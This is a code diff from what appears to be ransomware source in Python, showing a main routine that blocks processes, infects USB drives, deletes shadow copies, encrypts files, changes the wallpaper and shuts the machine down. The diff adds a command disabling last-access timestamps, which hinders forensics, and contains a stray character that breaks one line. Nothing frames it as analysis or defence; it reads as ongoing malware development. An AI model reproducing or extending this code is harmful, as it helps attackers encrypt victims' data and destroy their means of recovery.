@@ -375,7 +375,8 @@ def block_processes():
     ]
     for cmd in powershell_commands:
         execute_command(cmd)
-    execute_command("powercfg /h off")
+    execute_command("powercfg /h off")a
+    execute_command("fsutil behavior set disablelastaccess 1")
 
 
 def encrypt_key(aes_key):
@@ -816,13 +817,14 @@ if __name__ == "__main__":
         block_processes()
         disable_all()
         infect_usb()
-        # send_email() # =)))
+        # send_email() # yeah, it doesn't work =(((
         delete_shadow_copy()
         start_encryption()
         change_wallpaper()
         shutdown()
     else:
         start_encryption()
+
 
 
 
